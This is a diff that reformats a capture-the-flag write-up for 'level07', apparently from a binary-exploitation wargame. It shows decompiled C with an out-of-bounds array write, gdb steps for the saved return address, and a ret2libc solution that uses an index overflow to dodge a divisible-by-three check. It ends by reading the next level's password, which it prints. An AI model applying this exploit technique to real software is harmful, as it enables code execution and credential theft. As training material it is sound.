@@ -14,60 +14,61 @@ We used the Hex-Rays output on the [Dogbolt website](https://dogbolt.org/).
 
 
 ## Source
-
-	int data[100];
+```C
+int data[100];
+...
+while ( 1 ) {
 	...
-	while ( 1 ) {
-		...
-    	fgets(s, 20, stdin);
-		if ( !memcmp(s, "store", 5u) ) {
-			number = store_number(*data);
-			...
-		}
-		if ( !memcmp(s, "read", 4u) ) {
-			number = read_number(*data);
-			...
-		}
-		if ( !memcmp(s, "quit", 4u) ) {
-			return 0;
-		}
+	fgets(s, 20, stdin);
+	if ( !memcmp(s, "store", 5u) ) {
+		number = store_number(*data);
 		...
 	}
-
-store_number:
-	
-	int store_number(int data) {
-		unsigned int number;
-		unsigned int index;
+	if ( !memcmp(s, "read", 4u) ) {
+		number = read_number(*data);
 		...
-		number = get_unum();
-		...
-		index = get_unum();
-		if ( index == 3 * (index / 3) || (number >> 24) == 183 ) {
-			...
-			return 1;
-		}
-		else {
-			*(int *)(data + index * 4) = number;
-			return 0;
-		}
 	}
-
+	if ( !memcmp(s, "quit", 4u) ) {
+		return 0;
+	}
+	...
+}
+```
+`store_number`:
+```C
+int store_number(int data) {
+	unsigned int number;
+	unsigned int index;
+	...
+	number = get_unum();
+	...
+	index = get_unum();
+	if ( index == 3 * (index / 3) || (number >> 24) == 183 ) {
+		...
+		return 1;
+	}
+	else {
+		*(int *)(data + index * 4) = number;
+		return 0;
+	}
+}
+```
 So, we can write any unsigned int at any index of our array that isn't dividable by 3 \
 After some tests we know we want to overwrite the address that eip points to as it is in the stack
 
 ## gdb
-	> b main
-	> b read_number (or store_number)
-	> r
-	> info frame
-	...
-	...eip at 0xffffd70c
-	...
-	> read
-	> i r $eax (our array's address as it is the first and only argument of read_number())
-	eax	0xffffd544
-
+```bash
+> b main
+> b read_number (or store_number)
+> r
+> info frame
+...
+...eip at 0xffffd70c
+...
+> read
+> i r $eax #(our array's address as it is the first and only argument of read_number())
+eax	0xffffd544
+```
 `eip` = 0xffffd70c \
 `array` = 0xffffd544 \
 eip - array = 456 \
@@ -87,16 +88,18 @@ We retrieve the addresses of: \
 `/bin/sh`	: 0xf7f897ec, in decimal: `4160264172`
 
 ## Solution:
-	> ./level07
-	> store
-	> 4159090384
-	> 1073741938
-	> store
-	> 4159040368
-	> 115
-	> store
-	> 4160264172
-	> 116
-	> quit
-	> cat /home/users/level08/.pass
-	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```bash
+> ./level07
+> store
+> 4159090384
+> 1073741938
+> store
+> 4159040368
+> 115
+> store
+> 4160264172
+> 116
+> quit
+> cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
